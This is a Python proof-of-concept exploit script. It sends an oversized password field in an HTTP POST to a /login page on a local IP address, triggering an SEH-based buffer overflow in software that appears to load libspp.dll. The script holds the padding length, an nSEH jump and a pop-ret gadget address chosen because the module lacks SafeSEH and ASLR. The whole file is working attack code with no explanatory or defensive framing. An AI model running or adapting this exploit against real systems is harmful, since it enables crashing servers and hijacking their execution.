#!/usr/bin/python

import socket
import sys

host = "192.168.100.120"
port = 80

nSeh = "\x74\x06\x75\x04" # NetJumping - JZ (\x74) 6 bytes - JNZ (\x75) 4 bytes
Seh  = "\xBE\x59\x01\x10" # 0x100159BE - pop ebx # ret 0x04 - libspp.dll ASLR: False, Rebase: False, SafeSEH: False, OS: False, libspp.dll)

crash  = "A" * 14279
crash += nSeh
crash += Seh
crash += "D" * (30000 - len(crash))

req  = "POST /login HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/login\r\n"
req += "Content-Type: application/x-www-form-urlencoded\r\n"
req += "Content-Length: 30000\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n\r\n"
req += "username=admin"
req += "&password=/.:/" + crash + "\x00\x00&\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()

